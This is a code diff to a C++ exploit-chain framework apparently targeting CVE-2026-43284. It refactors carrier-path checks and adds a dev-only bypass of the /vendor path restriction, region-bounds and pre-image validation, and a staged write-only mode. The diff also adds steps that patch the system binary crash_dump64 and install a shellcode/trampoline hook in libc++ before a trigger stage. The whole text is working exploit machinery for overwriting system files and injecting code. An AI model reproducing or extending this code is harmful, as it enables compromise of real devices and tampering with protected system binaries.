@@ -11,24 +11,38 @@
 
 namespace ghostlock::backend::cve_2026_43284::steps {
 
-    bool valid_carrier_path(std::string_view path) noexcept {
-        if (path.empty() || path.size() >= kCarrierPathMaxBytes) {
-            return false;
+    namespace {
+        /* Structural constraints shared by the production and the dev-only
+         * carrier check: absolute, shorter than the 64-byte shellcode buffer
+         * and free of whitespace/control separators. The /vendor prefix policy
+         * is applied only by valid_carrier_path(). */
+        [[nodiscard]] bool valid_carrier_shape(std::string_view path) noexcept {
+            if (path.empty() || path.size() >= kCarrierPathMaxBytes) {
+                return false;
+            }
+            if (path[0] != '/') {
+                return false;
+            }
+            for (const char c : path) {
+                if (c == ' ' || c == '\t' || c == '\n' || c == '\r') {
+                    return false;
+                }
+            }
+            return true;
         }
-        if (path[0] != '/') {
+    } // namespace
+
+    bool valid_carrier_path(std::string_view path) noexcept {
+        if (!valid_carrier_shape(path)) {
             return false;
         }
         const bool under_vendor = path.substr(0U, 8U) == "/vendor/";
         const bool under_system_vendor = path.substr(0U, 15U) == "/system/vendor/";
-        if (!under_vendor && !under_system_vendor) {
-            return false;
-        }
-        for (const char c : path) {
-            if (c == ' ' || c == '\t' || c == '\n' || c == '\r') {
-                return false;
-            }
-        }
-        return true;
+        return under_vendor || under_system_vendor;
+    }
+
+    bool valid_dev_carrier_path(std::string_view path) noexcept {
+        return valid_carrier_shape(path);
     }
 
     bool CarrierList::add(const CarrierTarget &target) noexcept {
@@ -77,6 +91,16 @@ namespace {
     using ghostlock::backend::cve_2026_43284::steps::kChainBlockBytes;
     using ghostlock::backend::cve_2026_43284::steps::PatchPlan;
     using ghostlock::backend::cve_2026_43284::steps::PatchRegion;
+    using ghostlock::backend::cve_2026_43284::steps::valid_carrier_path;
+    using ghostlock::backend::cve_2026_43284::steps::valid_dev_carrier_path;
+
+    /* Applies the production /vendor prefix constraint unless the explicit dev
+     * staged-run escape hatch is set on the request. */
+    [[nodiscard]] bool carrier_path_allowed(std::string_view path,
+                                            bool allow_dev) noexcept {
+        return allow_dev ? valid_dev_carrier_path(path)
+                         : valid_carrier_path(path);
+    }
 
     /* Non-elidable wipe for the journal and any secret handed to release. */
     void secure_wipe(void *data, std::size_t len) noexcept {
@@ -135,33 +159,57 @@ namespace {
     };
 
     ApplyOutcome apply_plan(const PatchPlan &plan, const CarrierTarget &carrier,
-                            const ChainOps &ops, ChainWorkspace &workspace,
-                            ChainResult &result) noexcept {
-        if (plan.regions == nullptr || plan.region_count == 0U) {
-            result.error = ChainError::InvalidPlan;
+                            std::uint64_t target_size, const ChainOps &ops,
+                            ChainWorkspace &workspace, ChainResult &result) noexcept {
+        /* Region closure is checked before a single byte is written: the plan's
+         * declared extent, the carrier's declared size, the target file size
+         * and mutual overlap. */
+        const ChainError closure =
+                validate_plan_closure(plan, carrier.size, target_size);
+        if (closure != ChainError::None) {
+            result.error = closure;
             return ApplyOutcome::Failed;
         }
 
         std::uint32_t wrote_here = 0U;
         for (std::size_t ri = 0U; ri < plan.region_count; ++ri) {
             const PatchRegion &region = plan.regions[ri];
-            if (region.bytes == nullptr || region.len == 0U ||
-                (region.len % kChainBlockBytes) != 0U) {
-                result.error = ChainError::InvalidPlan;
-                return ApplyOutcome::Failed;
-            }
-            if (region.offset > std::numeric_limits<std::uint64_t>::max() - region.len) {
-                result.error = ChainError::InvalidPlan;
-                return ApplyOutcome::Failed;
-            }
-            const std::uint64_t end = region.offset + static_cast<std::uint64_t>(region.len);
-            if (carrier.size != 0U && end > carrier.size) {
-                result.error = ChainError::InvalidPlan;
-                return ApplyOutcome::Failed;
-            }
             if ((region.rollback || region.verify) && !ops.read_ready()) {
                 result.error = ChainError::NotAvailable;
                 return ApplyOutcome::Failed;
+            }
+
+            /* Optional pre-image assert: check the whole region against the
+             * caller-supplied original before writing any of it. A mismatch is
+             * final (no carrier fallback -- the declared file is the wrong or a
+             * changed one); a read failure before any write is reported as an
+             * unusable carrier, exactly like the journal read below. */
+            if (region.preimage != nullptr) {
+                const std::size_t preimage_blocks = region.len / kChainBlockBytes;
+                for (std::size_t b = 0U; b < preimage_blocks; ++b) {
+                    const std::uint64_t offset =
+                            region.offset +
+                            static_cast<std::uint64_t>(b) * kChainBlockBytes;
+                    std::array<std::uint8_t, kChainBlockBytes> old{};
+                    const long got =
+                            ops.read_block(ops.write.ctx, offset, old.data());
+                    if (got != static_cast<long>(kChainBlockBytes)) {
+                        if (wrote_here == 0U) {
+                            return ApplyOutcome::CarrierUnusable;
+                        }
+                        result.error = ChainError::ReadFailed;
+                        rollback_journal(ops, workspace, result);
+                        return ApplyOutcome::Failed;
+                    }
+                    if (!bytes_equal(old.data(),
+                                     region.preimage + b * kChainBlockBytes,
+                                     kChainBlockBytes)) {
+                        result.error = ChainError::PreImageMismatch;
+                        rollback_journal(ops, workspace, result);
+                        return ApplyOutcome::Failed;
+                    }
+                }
+                result.preimage_checked = true;
             }
 
             const std::size_t block_count = region.len / kChainBlockBytes;
@@ -228,6 +276,13 @@ namespace {
         result.last_stage = ChainStage::Cleanup;
         result.journal_overflow = workspace.journal_overflow;
         result.rollback_incomplete = workspace.rollback_incomplete;
+        /* Unconditional hook restore, before release closes the write surface.
+         * It runs on every terminus path (success, failure, early exit); the
+         * callback itself is a no-op when no hook was applied. */
+        if (ops.restore_hook != nullptr) {
+            ops.restore_hook(ops.write.ctx);
+            result.hook_restored = true;
+        }
         if (ops.release != nullptr) {
             ops.release(ops.write.ctx);
             result.cleanup_ran = true;
@@ -241,6 +296,53 @@ namespace {
 } // namespace
 
 namespace ghostlock::backend::cve_2026_43284::steps {
+
+    ChainError validate_plan_closure(const PatchPlan &plan,
+                                     std::uint64_t declared_extent,
+                                     std::uint64_t target_size) noexcept {
+        if (plan.regions == nullptr || plan.region_count == 0U) {
+            return ChainError::InvalidPlan;
+        }
+        for (std::size_t i = 0U; i < plan.region_count; ++i) {
+            const PatchRegion &region = plan.regions[i];
+            if (region.bytes == nullptr || region.len == 0U ||
+                (region.len % kChainBlockBytes) != 0U) {
+                return ChainError::InvalidPlan;
+            }
+            if (region.offset >
+                std::numeric_limits<std::uint64_t>::max() - region.len) {
+                return ChainError::InvalidPlan;
+            }
+            const std::uint64_t end =
+                    region.offset + static_cast<std::uint64_t>(region.len);
+            if (plan.extent != 0U && end > plan.extent) {
+                return ChainError::InvalidPlan;
+            }
+            if (declared_extent != 0U && end > declared_extent) {
+                return ChainError::InvalidPlan;
+            }
+            if (target_size != 0U && end > target_size) {
+                return ChainError::TargetOutOfBounds;
+            }
+        }
+        /* Regions are not required to be sorted, so check every pair. A plan in
+         * practice holds one module region; the O(n^2) walk keeps the unit
+         * allocation-free like the rest of the chain. */
+        for (std::size_t i = 0U; i < plan.region_count; ++i) {
+            const std::uint64_t i_begin = plan.regions[i].offset;
+            const std::uint64_t i_end =
+                    i_begin + static_cast<std::uint64_t>(plan.regions[i].len);
+            for (std::size_t j = i + 1U; j < plan.region_count; ++j) {
+                const std::uint64_t j_begin = plan.regions[j].offset;
+                const std::uint64_t j_end =
+                        j_begin + static_cast<std::uint64_t>(plan.regions[j].len);
+                if (i_begin < j_end && j_begin < i_end) {
+                    return ChainError::InvalidPlan;
+                }
+            }
+        }
+        return ChainError::None;
+    }
 
     ChainResult run_chain(const ChainRequest &request, const ChainOps &ops,
                           ChainWorkspace &workspace) noexcept {
@@ -257,7 +359,8 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         bool any_valid = false;
         if (request.carriers != nullptr) {
             for (std::size_t i = 0U; i < request.carrier_count; ++i) {
-                if (valid_carrier_path(request.carriers[i].path)) {
+                if (carrier_path_allowed(request.carriers[i].path,
+                                         request.allow_dev_carrier_path)) {
                     any_valid = true;
                     break;
                 }
@@ -286,16 +389,34 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 return finish(result, ops, workspace);
             }
         }
-        if (plan.regions == nullptr || plan.region_count == 0U) {
-            result.error = ChainError::InvalidPlan;
+        /* Plan closure is carrier-independent up to the carrier's own declared
+         * size, so check it here -- before patch #1 and before any write -- and
+         * again per carrier inside apply_plan(). */
+        const ChainError closure = validate_plan_closure(plan, 0U, request.target_size);
+        if (closure != ChainError::None) {
+            result.error = closure;
             return finish(result, ops, workspace);
+        }
+
+        /* patch #1 runs before the carrier write: the vendor read bridge execs
+         * the already-patched crash_dump64. The dev-only staged escape hatch
+         * must not touch system files, so it is skipped there. */
+        if (ops.patch_crash_dump != nullptr && !request.allow_dev_carrier_path) {
+            result.last_stage = ChainStage::PatchCrashDump;
+            const ChainError crash_error = ops.patch_crash_dump(ops.write.ctx);
+            if (crash_error != ChainError::None) {
+                result.error = crash_error;
+                return finish(result, ops, workspace);
+            }
+            result.crash_dump_patched = true;
         }
 
         for (std::size_t i = 0U; i < request.carrier_count; ++i) {
             const CarrierTarget &candidate = request.carriers[i];
             ChainWorkspace::CarrierAttempt attempt{};
             attempt.path = candidate.path;
-            if (!valid_carrier_path(candidate.path)) {
+            if (!carrier_path_allowed(candidate.path,
+                                      request.allow_dev_carrier_path)) {
                 attempt.error = ChainError::CarrierUnusable;
                 record_attempt(workspace, attempt);
                 continue;
@@ -303,7 +424,9 @@ namespace ghostlock::backend::cve_2026_43284::steps {
 
             const std::uint32_t before = result.blocks_written;
             result.carrier = &candidate;
-            const ApplyOutcome outcome = apply_plan(plan, candidate, ops, workspace, result);
+            const ApplyOutcome outcome =
+                    apply_plan(plan, candidate, request.target_size, ops, workspace,
+                               result);
             attempt.blocks_written = result.blocks_written - before;
 
             if (outcome == ApplyOutcome::Ok) {
@@ -325,6 +448,25 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         if (result.carrier == nullptr) {
             result.error = ChainError::NoCarrier;
             return finish(result, ops, workspace);
+        }
+
+        /* Staged write-only run: stop after every planned block was written and
+         * verified, before any trigger fires. The terminus (release + journal
+         * scrub) still runs exactly once. */
+        if (request.stop_after == ChainStopAfter::Write) {
+            return finish(result, ops, workspace);
+        }
+
+        /* libc++ sentry hook: locate + shellcode/trampoline + write, after the
+         * carrier write/verify and before the trigger (upstream order). */
+        if (ops.apply_hook != nullptr) {
+            result.last_stage = ChainStage::Hook;
+            const ChainError hook_error = ops.apply_hook(ops.write.ctx);
+            if (hook_error != ChainError::None) {
+                result.error = hook_error;
+                return finish(result, ops, workspace);
+            }
+            result.hook_applied = true;
         }
 
         result.last_stage = ChainStage::Trigger;
